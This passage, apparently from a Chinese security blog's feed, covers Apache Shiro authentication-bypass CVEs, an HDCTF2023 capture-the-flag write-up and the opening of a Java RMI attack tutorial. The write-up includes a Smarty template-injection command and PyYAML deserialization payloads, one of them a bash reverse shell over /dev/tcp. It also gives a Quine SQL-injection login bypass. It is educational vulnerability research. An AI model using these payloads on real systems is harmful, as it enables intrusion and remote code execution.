OK 的，整个思路都没问题，但是随着 Spring 自身代码的迭代，却又将安全问题暴露了出来。在高版本的 Spring 中，由于 alwaysUseFullPath 默认为 true ，导致应用程序使用 UrlPathHelper.defaultInstance 来处理，而不是 Shiro 实现的 ShiroUrlPathHelper 来处理。 这样就导致这个修复补丁又被完美的绕过了。 CVE-2020-17523漏洞信息 漏洞信息 详情 漏洞编号 CVE-2020-17523 / CNVD-2021-09492 影响版本 shiro &lt; 1.7.1 漏洞描述 Apache Shiro 由于处理身份验证请求时存在权限绕过漏洞，远程攻击者可以发送特制的 HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。 漏洞关键字 Spring | trim | %20 | 绕过 | /%20%20/ 漏洞补丁 Commit-ab1ea4a 相关链接 https://www.anquanke.com/post/id/230935 https://www.eso.org/~ndelmott/url_encode.html 漏洞详解继续绕过... 在使用 . 、/ 、; 的 URL 编码绕过之后，这次使用的是空格的 URL 编码：%20。 之前讲过，在匹配访问路径与配置鉴权路径时，在 AntPathMatcher#doMatch 方法中，首先会调用 org.apache.shiro.util.StringUtils#tokenizeToStringArray 方法将 pattern 以及 path 处理成 String 数组，再进行比对。 这个方法会继续调用有四个参数的重写方法，并且后两个参数的值均为 true。其实这部分也是抄的 spring 的代码。 可以看到后两个布尔类型参数的意义是对 StringTokenizer 结果的处理的标志 flag，代表是否对 token 进行 trim 操作，以及是否忽略空的 token。 因此，在被 WebUtils#getPathWithinApplication 方法处理过的 URI，再与配置路径匹配时，又会处理空格。 因此对于 &quot;/audit/%20&quot; 这种访问，可以理解为会被 shiro 处理成 &quot;/audit/&quot; 这种格式去匹配。 而 Spring 的处理逻辑，在配置了 CVE-2020-17510 的安全补丁后，虽然与 shiro 保持了一致，但是在匹配 handler 时并没有空格的处理，因此可以继续以字符串的方式匹配。 依旧是依赖单个 &quot;*&quot; 的通配符以及 PathVariable 注解 String 类型的参数的场景触发漏洞。复现如下，%20 随便加。 由于之前的安全修复，URL 中的非 ASCII 字符会被 filter 干掉，因此，我 FUZZ 了%00-ff 的全部字符，发现只有 %20 能用。 漏洞修复Shiro 在 Commit-ab1ea4a 中提交了本次漏洞的修复。 可以看到是指定了 StringUtils#tokenizeToStringArray 方法的第三个参数 trimTokens 为 false，也就是说不再去除空格，从而消除了本次漏洞的影响。 其实即使不报安全漏洞， shiro 也应该修复这个逻辑，因为 spring 本身可以支持以空格作为 RequestMapping。 而 shiro 对其处理逻辑则有问题，配置后访问将不生效。 如下： CVE-2021-41303漏洞信息 漏洞信息 详情 漏洞编号 CVE-2021-41303 / SHIRO-825 影响版本 shiro &lt; 1.8.0 漏洞描述 Apache Shiro 与 Spring Boot 一起使用时，远程攻击者可以发送特制的 HTTP 请求， 绕过身份验证过程并获得对应用程序的未授权访问。 漏洞关键字 Spring | 回退 | /aaa/*/ | 绕过 漏洞补丁 Commit-4a20bf0 相关链接 [https://threedr3am.github.io/](https://threedr3am.github.io/2021/09/22/从源码diff分析Apache-Shiro 1.7.1版本的auth bypass（CVE-2021-41303）/) 漏洞详解在上一个版本的更新中，除了安全修复，还更新了几个逻辑，来优化对路径末尾 &quot;/&quot; 的情况的处理。 第一是匹配路径的方法 PathMatchingFilter#pathsMatch，在曾经 SHIRO-682 的更新中针对这个方法进行了修改，为了兼容 Spring 对访问路径最后一个 &quot;/&quot; 的支持。 在本次版本更新中，添加了一层判断逻辑，即先使用原始请求判断，如果没有匹配成功，再使用去掉 &quot;/&quot; 的路径尝试匹配。 第二是在 PathMatchingFilterChainResolver 中新增了一个 removeTrailingSlash 方法，用来去除请求路径中的最后的 &quot;/&quot;。 并在 getChain 方法中更改逻辑，依旧是先使用原来的请求匹配，匹配不到再使用去除请求路径之后的 &quot;/&quot; 来匹配。 原本的逻辑是，拿到 URI ，直接判断最后是不是 “/”，如果是直接去掉，然后匹配和处理，但改过之后，直接拿过来匹配，如果没匹配到，再尝试去掉 “/” 在匹配，这种情况下，对于带 “/” 的请求将会匹配两次。 不但逻辑复杂了，而且还写出了 BUG。在 else 语句块中，没有将 pathPattern 给到 filterChainManager#proxy 方法，反而是将用户可控的 requestURINoTrailingSlash 给了进去。 这为什么会产生漏洞呢？这一切先从一个 BUG 说起：SHIRO-825。首先来复现一下这个 ISSUES ，我们配置如下，同样是使用单个 &quot;*&quot; 匹配: chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;list&quot;, &quot;authc&quot;); chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;*&quot;, &quot;anon&quot;); 可以看到，/audit/ 路径下只有 list 是需要鉴权的，其他不需要。Controller 代码如下： @Controller @RequestMapping(value &#x3D; &quot;&#x2F;audit&quot;) public class AuditController &#123; @GetMapping(value &#x3D; &quot;&#x2F;list&quot;) public void list(HttpServletResponse response) throws IOException &#123; response.getWriter().println(&quot;you have to be auditor to view this page&quot;); &#125; @GetMapping(value &#x3D; &quot;&#x2F;&#123;name&#125;&quot;) public void list(@PathVariable String name, HttpServletResponse response) throws IOException &#123; response.getWriter().println(&quot;no need auth to see this page:&quot; + name); &#125; &#125; 此时访问 &quot;/audit/aaa&quot; 正常： 但是访问 &quot;/audit/aaa/&quot; 报错： 原因就是，shiro 会用处理过的用户请求路径去配置文件里找对应的路径，自然找不到就抛异常的。 那这个 BUG 是如何延伸成为漏洞的呢？不难想到，如果 shiro 在配置文件中找到了这个路径，那逻辑就正常了。我们再来配置一下场景，现在改为如下配置： chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;*&quot;, &quot;authc&quot;); chainDefinition.addPathDefinition(&quot;&#x2F;audit&#x2F;list&quot;, &quot;anon&quot;); 现在的逻辑是，配置了 /audit/* 需要认证，而 /audit/list 不需要认证，注意配置的顺序，正常逻辑下，对于 /audit/list 对应的路径，是需要鉴权的，因为他会被 /audit/* 匹配到，但是 /audit/* 不能匹配 /audit/list/，会去掉 &quot;/&quot; 进行匹配，能匹配到，且在后续的逻辑中也可以找到对应的路径，就可以绕过鉴权。 漏洞修复Shiro 在 Commit-4a20bf0 中修复了此问题。可以看到修改后正确的传入了 pathPattern。 思考本漏洞的分析是参考了 threedr3am 师傅的博客，但存在几个疑问： 本 CVE 在 CVSS 3.0 获得了 9.8 的评分，CVSS 2.0 获得了 7.5 的评分，但上面的漏洞场景似乎限制很大，给不到高危。 ISSUES 的报送者是报送 BUG，并非安全风险，而官方的通告又致谢了另外一个安全从业者。 我翻了所有的更新代码，确实没找到其他类似漏洞修复的地方，因为 shiro 一般修绕过的时候都会给出新的 testcase，确实没找到别的。 CVE-2022-32532漏洞信息 漏洞信息 详情 漏洞编号 CVE-2022-32532 影响版本 shiro &lt; 1.9.1 漏洞描述 RegexRequestMatcher 在使用带有 &quot;.&quot; 的正则时，可能会导致权限绕过 漏洞关键字 RegexRequestMatcher | . | 绕过 漏洞补丁 Commit-4a20bf0 相关链接 CVE-2022-32532 https://lists.apache.org/thread/y8260dw8vbm99oq7zv6y3mzn5ovk90xh https://tanzu.vmware.com/security/cve-2022-22978 漏洞详解此漏洞原理为 CVE-2022-22978 ，是当 RegexRequestMatcher 使用了 &quot;.&quot; 来进行正则匹配时，导致的权限绕过。Spring Security 报了一次，跑到 shiro 里再报一次，很合理。 漏洞的成因很简单，就是 RegexRequestMatcher 默认使用的正则匹配的 &quot;.&quot; 不会匹配换行符，因此可以使用在路径中添加换行符来绕过权限匹配。这里不再重复漏洞原理，主要是正则的使用问题，简单复现一下。 漏洞环境由漏洞报送者 4ra1n 师傅发布在 github 了，这里我们就使用他的环境。 环境中将鉴权组件配置为了自定义的 AccessControlFilter 实现类，并将 PatternMatcher 配置为了 RegExPatternMatcher，在之前的 shiro CVE 中，我们都是使用 shiro 自己默认的 AntPathMatcher 的特性来绕过鉴权。 而 org.apache.shiro.util.RegExPatternMatcher 是使用了 Pattern.compile(pattern) 来进行正则匹配。 然后将自定义的实现类配置在 SpringShiroFilter 中。 此时访问 /permit/aa 时，被正则匹配拦住： 访问 /permit/a%0aa 时，无法匹配到，绕过鉴权： 这中间差异性之前的漏洞也描述过了，不再重复。 漏洞修复Shiro 在 Commit-6bcb92e 中修复了此问题。可以看到为 RegexRequestMatcher 默认添加了 Pattern.DOTALL 选项，并同时添加了大小写敏感的选项。 总结能写(chao)完这篇文章首先很感谢su18师傅写的四篇关于shiro安全的博客，毕竟这东西要查重的话我的查重率估计在80%以上（ 另外对于shiro的漏洞，感觉看我之后只有两种漏洞，shiro550和路径解析问题导致的权限绕过（不过CVE-2014-0074好像不属于这两种，但是我也没看 shiro550没什么好说的，很简单的链子，至于它的强化版shiro721在我看来漏洞利用实在是有点繁琐，不过GitHub似乎是有一键打的攻击。 而对于路径解析的这些漏洞，多数是由于 shiro 的处理逻辑有误，或和中间件、其他框架的处理逻辑不一致导致的安全问题，通常对各种框架和中间件的版本要求都很严格。","categories":[],"tags":[{"name":"web学习","slug":"web学习","permalink":"https://ethe448.github.io/tags/web%E5%AD%A6%E4%B9%A0/"},{"name":"Java","slug":"Java","permalink":"https://ethe448.github.io/tags/Java/"}]},{"title":"HDCTF2023 WP","slug":"HDCTF2023-WP","date":"2023-04-23T05:36:43.000Z","updated":"2023-05-16T15:32:40.436Z","comments":true,"path":"2023/04/23/HDCTF2023-WP/","link":"","permalink":"https://ethe448.github.io/2023/04/23/HDCTF2023-WP/","excerpt":"","text":"海南大学的比赛，六个web就出了四个，java的题目还是一窍不通。我是菜鸟，想寄就寄 Welcome To HDCTF 2023直接改js，没啥好说的 SearchMastersmarty的模板注入，看出题人的原意是用Smarty 4.1.0的CVE打，但是实际上好像是个payload都能用。 比如{if system(&quot;cat /f*&quot;)}{/if} YamiYami是之前国赛的一个题改的，但是在读源码的地方加了过滤 比赛的时候没读出来源码，不过看见了个非预期 直接读file:///proc/1/environ 接下来说一下预期解 首先是这个过滤的问题 可以通过对file后边的内容进行双重url编码进行绕过 得到源码之后前半部分其实跟国赛那个差不多 #encoding:utf-8 import os import re, random, uuid from flask import * from werkzeug.utils import * import yaml from urllib.request import urlopen app &#x3D; Flask(__name__) random.seed(uuid.getnode()) app.config[&#39;SECRET_KEY&#39;] &#x3D; str(random.random()*233) app.debug &#x3D; False BLACK_LIST&#x3D;[&quot;yaml&quot;,&quot;YAML&quot;,&quot;YML&quot;,&quot;yml&quot;,&quot;yamiyami&quot;] app.config[&#39;UPLOAD_FOLDER&#39;]&#x3D;&quot;&#x2F;app&#x2F;uploads&quot; @app.route(&#39;&#x2F;&#39;) def index(): session[&#39;passport&#39;] &#x3D; &#39;YamiYami&#39; return &#39;&#39;&#39; Welcome to HDCTF2023 &lt;a href&#x3D;&quot;&#x2F;read?url&#x3D;https:&#x2F;&#x2F;baidu.com&quot;&gt;Read somethings&lt;&#x2F;a&gt; &lt;br&gt; Here is the challenge &lt;a href&#x3D;&quot;&#x2F;upload&quot;&gt;Upload file&lt;&#x2F;a&gt; &lt;br&gt; Enjoy it &lt;a href&#x3D;&quot;&#x2F;pwd&quot;&gt;pwd&lt;&#x2F;a&gt; &#39;&#39;&#39; @app.route(&#39;&#x2F;pwd&#39;) def pwd(): return str(pwdpath) @app.route(&#39;&#x2F;read&#39;) def read(): try: url &#x3D; request.args.get(&#39;url&#39;) m &#x3D; re.findall(&#39;app.*&#39;, url, re.IGNORECASE) n &#x3D; re.findall(&#39;flag&#39;, url, re.IGNORECASE) if m: return &quot;re.findall(&#39;app.*&#39;, url, re.IGNORECASE)&quot; if n: return &quot;re.findall(&#39;flag&#39;, url, re.IGNORECASE)&quot; res &#x3D; urlopen(url) return res.read() except Exception as ex: print(str(ex)) return &#39;no response&#39; def allowed_file(filename): for blackstr in BLACK_LIST: if blackstr in filename: return False return True @app.route(&#39;&#x2F;upload&#39;, methods&#x3D;[&#39;GET&#39;, &#39;POST&#39;]) def upload_file(): if request.method &#x3D;&#x3D; &#39;POST&#39;: if &#39;file&#39; not in request.files: flash(&#39;No file part&#39;) return redirect(request.url) file &#x3D; request.files[&#39;file&#39;] if file.filename &#x3D;&#x3D; &#39;&#39;: return &quot;Empty file&quot; if file and allowed_file(file.filename): filename &#x3D; secure_filename(file.filename) if not os.path.exists(&#39;.&#x2F;uploads&#x2F;&#39;): os.makedirs(&#39;.&#x2F;uploads&#x2F;&#39;) file.save(os.path.join(app.config[&#39;UPLOAD_FOLDER&#39;], filename)) return &quot;upload successfully!&quot; return render_template(&quot;index.html&quot;) @app.route(&#39;&#x2F;boogipop&#39;) def load(): if session.get(&quot;passport&quot;)&#x3D;&#x3D;&quot;Welcome To HDCTF2023&quot;: LoadedFile&#x3D;request.args.get(&quot;file&quot;) if not os.path.exists(LoadedFile): return &quot;file not exists&quot; with open(LoadedFile) as f: yaml.full_load(f) f.close() return &quot;van you see&quot; else: return &quot;No Auth bro&quot; if __name__&#x3D;&#x3D;&#39;__main__&#39;: pwdpath &#x3D; os.popen(&quot;pwd&quot;).read() app.run( debug&#x3D;False, host&#x3D;&quot;0.0.0.0&quot; ) print(app.config[&#39;SECRET_KEY&#39;]) 首先要先伪造session去进入/boogipop路由 这里是伪随机random.seed(uuid.getnode())，uuid.getnode()得到的是计算机的硬件地址，也就是在/sys/class/net/eth0/address里 然后就用工具伪造session就行了 因为会去利用yaml.full_load去加载文件，所以后边是一个yaml的反序列化 具体可以看这两个，payload感觉是根据python源码写出来的，只会照抄（ 浅谈PyYAML反序列化漏洞 - 先知社区 (aliyun.com) PyYAML反序列化防御和ByPass - FreeBuf网络安全行业门户 PyYaml反序列化 | Boogiepop Doesn&#39;t Laugh (boogipop.com) 写几个常用的payload PyYAML版本 &lt; 5.1 # python&#x2F;object&#x2F;apply链 yaml.load(&#39;exp: !!python&#x2F;object&#x2F;apply:os.system [&quot;whoami&quot;]&#39;) yaml.load(&quot;exp: !!python&#x2F;object&#x2F;apply:os.system [&#39;whoami&#39;]&quot;) # 引号当然不是必须的 yaml.load(&quot;exp: !!python&#x2F;object&#x2F;apply:os.system [whoami]&quot;) yaml.load(&quot;&quot;&quot; exp: !!python&#x2F;object&#x2F;apply:os.system - whoami &quot;&quot;&quot;) yaml.load(&quot;&quot;&quot; exp: !!python&#x2F;object&#x2F;apply:os.system args: [&quot;whoami&quot;] &quot;&quot;&quot;) # command 是 os.system 的参数名 yaml.load(&quot;&quot;&quot; exp: !!python&#x2F;object&#x2F;apply:os.system kwds: &#123;&quot;command&quot;: &quot;whoami&quot;&#125; &quot;&quot;&quot;) yaml.load(&quot;!!python&#x2F;object&#x2F;apply:os.system [whoami]: exp&quot;) yaml.load(&quot;!!python&#x2F;object&#x2F;apply:os.system [whoami]&quot;) yaml.load(&quot;&quot;&quot; !!python&#x2F;object&#x2F;apply:os.system - whoami &quot;&quot;&quot;) #python&#x2F;object&#x2F;new 和 apply的payload一样 就是把apply改成new了 PyYAML版本 &gt;&#x3D; 5.1 在使用unsafe_load方法或是UnsafeLoader构造器时和5.1以下版本一样，但是默认使用的是FullConstructor yaml.full_load(&quot;&quot;&quot; !!python&#x2F;object&#x2F;new:type args: - exp - !!python&#x2F;tuple [] - &#123;&quot;extend&quot;: !!python&#x2F;name:exec &#125; listitems: &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot; &quot;&quot;&quot;) # 在 Python 中，当你使用 type 函数创建一个新类型时，你可以提供三个参数：类型的名称，父类的元组（如果没有父类则为空元组），以及一个包含属性和方法的字典。如果不需要传递参数给构造函数，那么第二个参数就可以是一个空元组 yaml.full_load(&quot;&quot;&quot; !!python&#x2F;object&#x2F;new:str args: [] # 通过 state 触发调用 state: !!python&#x2F;tuple - &quot;__import__(&#39;os&#39;).system(&#39;whoami&#39;)&quot; # 下面构造 exp - !!python&#x2F;object&#x2F;new:staticmethod args: [] state: update: !!python&#x2F;name:eval items: !!python&#x2F;name:list # 不设置这个也可以，会报错但也已经执行成功 &quot;&quot;&quot;) !!python&#x2F;object&#x2F;new:str args: [] state: !!python&#x2F;tuple - &quot;__import__(&#39;os&#39;).system(&#39;bash -c \\&quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;ip&#x2F; &lt;&amp;1\\&quot;&#39;)&quot; - !!python&#x2F;object&#x2F;new:staticmethod args: [] state: update: !!python&#x2F;name:eval items: !!python&#x2F;name:list 上传yaml文件之后 我这里不小心执行了一遍flag.sh，把flag给重写了（ LoginMaster（Quine注入）这题感觉挺有意思的，虽然是第五空间的原题 robots.txt会给出得到flag的条件和一些过滤，不过我这直接贴第五空间的源码吧 &lt;?php include_once(&quot;lib.php&quot;); function alertMes($mes,$url)&#123; die(&quot;&lt;script&gt;alert(&#39;&#123;$mes&#125;&#39;);location.href&#x3D;&#39;&#123;$url&#125;&#39;;&lt;&#x2F;script&gt;&quot;); &#125; function checkSql($s) &#123; if(preg_match(&quot;&#x2F;regexp|between|in|flag|&#x3D;|&gt;|&lt;|and|\\||right|left|reverse|update|extractvalue|floor|substr|&amp;|;|\\\\\\$|0x|sleep|\\ &#x2F;i&quot;,$s))&#123; alertMes(&#39;hacker&#39;, &#39;index.php&#39;); &#125; &#125; if (isset($_POST[&#39;username&#39;]) &amp;&amp; $_POST[&#39;username&#39;] !&#x3D; &#39;&#39; &amp;&amp; isset($_POST[&#39;password&#39;]) &amp;&amp; $_POST[&#39;password&#39;] !&#x3D; &#39;&#39;) &#123; $username&#x3D;$_POST[&#39;username&#39;]; $password&#x3D;$_POST[&#39;password&#39;]; if ($username !&#x3D;&#x3D; &#39;admin&#39;) &#123; alertMes(&#39;only admin can login&#39;, &#39;index.php&#39;); &#125; checkSql($password); $sql&#x3D;&quot;SELECT password FROM users WHERE username&#x3D;&#39;admin&#39; and password&#x3D;&#39;$password&#39;;&quot;; $user_result&#x3D;mysqli_query($con,$sql); $row &#x3D; mysqli_fetch_array($user_result); if (!$row) &#123; alertMes(&quot;something wrong&quot;,&#39;index.php&#39;); &#125; if ($row[&#39;password&#39;] &#x3D;&#x3D;&#x3D; $password) &#123; die($FLAG); &#125; else &#123; alertMes(&quot;wrong password&quot;,&#39;index.php&#39;); &#125; &#125; if(isset($_GET[&#39;source&#39;]))&#123; show_source(__FILE__); die; &#125; ?&gt; 可以看到只要满足$username == &#39;admin&#39;和$row[&#39;password&#39;] === $password就能拿到flag 但是实际上会发现当username是admin的时候，不管password是什么都会报something wrong 也就是说row根本不存在，这个登录是一个空表 所以这时候就要用quine的方式让输入等于输出 Quine又叫做自产生程序，在sql注入技术中，这是一种使得输入的sql语句和输出的sql语句一致的技术，常用于一些特殊的登陆绕过sql注入中。 其实就是利用sql的replace函数进行一次次的嵌套，实现了让输入等于输出的功能 CTFHub_2021-第五空间智能安全大赛-Web-yet_another_mysql_injection（quine注入） - zhengna - 博客园 (cnblogs.com) 从三道赛题再谈Quine trick-安全客 - 安全资讯平台 (anquanke.com) 当我们输入的是下面这个的时候，返回的内容也是这个 replace(replace(&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;,char(34),char(39)),char(46),&#96;&#96;&#39;replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)&#39;); 但是在sql注入里，我们首先需要去闭合原有的sql语句，还要注释后面的语句，因此需要对语句进行修改。 1&#39;UNION(SELECT(replace(replace(&#39;1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;,char(34),char(39)),char(46),&#39;1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;)))# 替换后变为 1&#39;UNION(SELECT(replace(replace(&#39;1&quot;UNION(SELECT(replace(replace(&quot;%&quot;,char(34),char(39)),char(37),&quot;%&quot;)))#&#39;,char(34),char(39)),char(46),&#39;1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))#&#39;)))# 简单说Quine注入的主要结构就是 replace(A,分隔符,A) 在上面那个payload中 A为： 1&quot;UNION(SELECT(replace(replace(&quot;.&quot;,char(34),char(39)),char(46),&quot;.&quot;)))# 而去掉了这两个A之后的payload为 1&#39;UNION(SELECT(replace(replace(&#39;&#39;,char(34),char(39)),char(46),&#39;&#39;)))# 可以看到和A的结构几乎一模一样，所以Quine注入其实就是replace(A,分隔符,A)这种形式的嵌套","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"RMI攻击（一）","slug":"RMI攻击（一）","date":"2023-04-21T11:16:08.000Z","updated":"2023-05-20T06:54:38.501Z","comments":true,"path":"2023/04/21/RMI攻击（一）/","link":"","permalink":"https://ethe448.github.io/2023/04/21/RMI%E6%94%BB%E5%87%BB%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"","text":"RMI介绍​ RMI (Remote Method Invocation) 远程方法调用，顾名思义，它的功能就是就是实现调用远程方法 ​ 实现RMI的协议叫JRMP，RMI实现的过程中进行了java对象的传递，自然使用了序列化和反序列化，也自然产生了反序列化漏洞 这里介绍一下rmi的流程。 首先，rmi里有三个角色，分别是客户端、服务端以及注册中心 设计上客户端和服务端不直接通信，而是通过注册中心通信。简单理解三者的关系如下：服务端创建远程对象，并将远程对象在注册中心注册，客户端到注册中心端查找并获取对应的远程对象，最终在服务端调用其方法。 具体实现时，客户端没有直接调用服务器上的对象，也没有直接调用注册中心上的对象，而是操作一个进行网络通信的代理类叫Stub，服务端也一样有一个类似的代理类叫Skel，具体操作都是这两个代理类进行的。 RMI 引入了两个概念，分别是 Stubs（客户端存根） 以及 Skeletons（服务端骨架），当客户端（Client）试图调用一个在远端的 Object 时，实际调用的是客户端本地的一个代理类（Proxy），这个代理类就称为 Stub，而在调用远端（Server）的目标类之前，也会经过一个对应的远端代理类，就是 Skeleton，它从 Stub 中接收远程方法调用并传递给真实的目标类。Stubs 以及 Skeletons 的调用对于 RMI 服务的使用者来讲是隐藏的，我们无需主动的去调用相关的方法。但实际的客户端和服务端的网络通信时通过 Stub 和 Skeleton 来实现的。 整体调用时序图： rmi demo写个demo具体介绍一下rmi的利用 首先需要定义远程对象类。远程方法调用不是所有类都可以，想进行远程方法调用的类，需要实现一个继承Remote接口的接口，远程方法要抛RemoteException。先定义这个接口： import java.rmi.Remote; import java.rmi.RemoteException; public interface IRemoteObj extends Remote &#123; &#x2F;&#x2F; 远程方法要抛RemoteException public String sayHello() throws RemoteException; &#125; 然后去定义实现类 这个实现类在后续需要被远程调用，服务端需要把这个远程对象发布出去，因此也有条件。 这个实现类必须调用UnicastRemoteObject.exportObject方法 这里有两个选择，一个是去继承UnicastRemoteObject，然后UnicastRemoteObject的构造方法就会自动去调用UnicastRemoteObject.exportObject。另一个是直接自己去调用UnicastRemoteObject.exportObject方法。 定义好的远程对象类 import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class IRemoteObjImpl extends UnicastRemoteObject implements IRemoteObj&#123; protected IRemoteObjImpl() throws RemoteException &#123; &#125; @Override public String sayHello() throws RemoteException &#123; String name &#x3D; this.getClass().getName(); System.out.println(name); return name; &#125; &#125; 远程对象类定义好后，也就是说我们现在有可以发布的东西了，接下来就可以去定义服务端和客户端了，服务端一般和注册中心写在一起，做如下几件事：1、首先创建远程对象，创建时也会进行远程对象的发布。2、创建注册中心3、将远程对象绑定到注册中心 public class RMIServer &#123; public static void main(String[] args) throws RemoteException, AlreadyBoundException &#123; &#x2F;&#x2F;创建远程对象 IRemoteObjImpl iRemoteObj &#x3D; new IRemoteObjImpl(); &#x2F;&#x2F;创建注册中心 Registry registry &#x3D; LocateRegistry.createRegistry(1099); &#x2F;&#x2F;把远程对象发布到注册中心上，这里还提供了查询（lookup）、重新绑定（rebind）、接触绑定（unbind）、list（列表）的方式 registry.bind(&quot;iRemoteObj&quot;,iRemoteObj); &#125; &#125; 这里看到好像还可以用java.rmi.Naming类来实现 方式是Naming.bind(&quot;rmi://localhost:1099/iRemoteObj&quot;, iRemoteObj); 接下来是客户端，客户端也做三件事 1、获取“注册中心”对象2、利用注册中心对象获取远程对象3、调用远程对象上的方法 import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIClient &#123; public static void main(String[] args) throws RemoteException, NotBoundException &#123; Registry registry &#x3D; LocateRegistry.getRegistry(&quot;127.0.0.1&quot;, 1099); IRemoteObj remoteObj &#x3D; (IRemoteObj) registry.lookup(&quot;iRemoteObj&quot;); String s &#x3D; remoteObj.sayHello(); System.out.println(s); &#125; &#125; 启动之后在服务端上可以看见输出的name，在客户端上也可以接收返回的name值并打印出来 源码分析创建远程对象IRemoteObjImpl iRemoteObj = new IRemoteObjImpl(); 这行代码的作用就是创建远程对象 具体的执行过程是 首先调用IRemoteObjImpl的构造函数 然后就会进入UnicastRemoteObject的构造函数 再进入exportObject方法，会看到UnicastServerRef类，它代表远程对象的引用。这个类继承了Dispatcher接口，代表由它分发客户端的操作给远程对象。 根据注释能知道这里obj是要导出的远程对象，port是导出的端口，返回值是存根，也就是stub 再跟到UnicastServerRef里 这里出现了一个LiveRef类，接着跟进去 在LiveRef的构造方法里有一个TCPEndpoint类，显然和通信有关，再继续跟 public static TCPEndpoint getLocalEndpoint(int port) &#123; return getLocalEndpoint(port, null, null); &#125; public static TCPEndpoint getLocalEndpoint(int port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf) &#123; &#x2F;* * 查找将一个端点键映射到此客户端&#x2F;服务器套接字工厂对的本地唯一端点列表（可能为null）的特定端口。 *&#x2F; TCPEndpoint ep &#x3D; null; &#x2F;&#x2F; 使用localEndpoints对象对方法进行同步 synchronized (localEndpoints) &#123; &#x2F;&#x2F; 创建一个 TCPEndpoint 实例作为端点键 TCPEndpoint endpointKey &#x3D; new TCPEndpoint(null, port, csf, ssf); &#x2F;&#x2F; 获取本地唯一端点列表 LinkedList&lt;TCPEndpoint&gt; epList &#x3D; localEndpoints.get(endpointKey); &#x2F;&#x2F; 获取本地主机名称 String localHost &#x3D; resampleLocalHost(); &#x2F;&#x2F; 如果本地唯一端点列表不存在 if (epList &#x3D;&#x3D; null) &#123; &#x2F;* * 创建新的端点列表 *&#x2F; &#x2F;&#x2F; 创建一个 TCPEndpoint 实例，作为新的唯一端点 ep &#x3D; new TCPEndpoint(localHost, port, csf, ssf); &#x2F;&#x2F; 创建一个 LinkedList 实例，将新唯一端点添加到其中 epList &#x3D; new LinkedList&lt;TCPEndpoint&gt;(); epList.add(ep); &#x2F;&#x2F; 设置唯一端点的监听端口和传输协议 ep.listenPort &#x3D; port; ep.transport &#x3D; new TCPTransport(epList); &#x2F;&#x2F; 将端点键与新的唯一端点列表加入到 localEndpoints 对象中 localEndpoints.put(endpointKey, epList); &#x2F;&#x2F; 如果 tcpLog 的记录级别为 BRIEF，则记录端口创建成功的日志信息 if (TCPTransport.tcpLog.isLoggable(Log.BRIEF)) &#123; TCPTransport.tcpLog.log(Log.BRIEF, &quot;created local endpoint for socket factory &quot; + ssf + &quot; on port &quot; + port); &#125; &#125; else &#123; synchronized (epList) &#123; &#x2F;&#x2F; 获取本地唯一端点列表的最后一个唯一端点 ep &#x3D; epList.getLast(); &#x2F;&#x2F; 获取最后一个唯一端点的主机名称、端口号和传输协议 String lastHost &#x3D; ep.host; int lastPort &#x3D; ep.port; TCPTransport lastTransport &#x3D; ep.transport; &#x2F;&#x2F; 如果本地主机名称不为 null 且不等于最后一个唯一端点的主机名称 if (localHost !&#x3D; null &amp;&amp; !localHost.equals(lastHost)) &#123; &#x2F;* * 主机名称已更新；将更新的端点添加到列表中 *&#x2F; &#x2F;&#x2F; 如果最后一个唯一端点的端口号已设置，则移除旧唯一端点 if (lastPort !&#x3D; 0) &#123; epList.clear(); &#125; &#x2F;&#x2F; 创建一个 TCPEndpoint 实例，作为新的唯一端点 ep &#x3D; new TCPEndpoint(localHost, lastPort, csf, ssf); &#x2F;&#x2F; 设置唯一端点的监听端口和传输协议 ep.listenPort &#x3D; port; ep.transport &#x3D; lastTransport; &#x2F;&#x2F; 将新唯一端点添加到列表中 epList.add(ep); &#125; &#125; &#125; &#125; return ep; &#125; 这段代码有点难读，但是最后返回的就是一个TCPEndPoint实例 这个TCPEndPoint显然就是一个和网络请求有关的类 里面的属性有端口，ip之类的信息，其中的TCPTransport是真正的处理网络请求的类，这里实际上将TCPEndPoint和TCPTransport进行了绑定。 返回了一个ep变量 所以LiveRef里面就是放了一个TCPEndPoint。那么LiveRef可以理解为一个封装了ip、端口和一些id信息之类的辅助类。 现在LiveRef已经生成了 重新回到UnicastServerRef的构造函数 public UnicastServerRef(int port) &#123; super(new LiveRef(port)); &#125; 这里调用了父类UnicastRef的构造函数 这里只有一个赋值操作 这时ref里存的就是原本在liveRef里的一些信息 记住这个ref，在之后我们还会用到 赋值操作结束后，又重新回到了UnicastRemoteObject类的exportObject方法 上面的这些过程中，LiveRef、TCPEndoPint、TCPTransport是处理网络通信的类。UnicastRef、UnicastServerRef是远程对象的引用对象，是宏观上处理网络请求的类，也是实现RMI调用的核心逻辑的类。UnicastRemoteObject就是远程对象的基础类，它并不直接处理网络请求，而是通过里面的UnicastServerRef处理。 目前其实就创建了一个UnicastServerRef，它的ref是一个LiveRef，ref里面有一个TCPEndpoint叫ep，ep里面有个TCPTransport叫transport。继续跟进UnicastRemoteObject#exportObject(Remote obj, UnicastServerRef sref) 这里把sref，也就是包含着那一堆信息的内容给了一个UnicastRemoteObject实例的ref属性，其实是它父类的RemoteObject的ref属性 而这个这个实例应该是我们写的继承了UnicastRemoteObject的实现类 接下来调用了UnicastServerRef的exportObject方法，把刚才的这个实例传进去了， public Remote exportObject(Remote impl, Object data, boolean permanent) throws RemoteException &#123; Class&lt;?&gt; implClass &#x3D; impl.getClass(); Remote stub; try &#123; stub &#x3D; 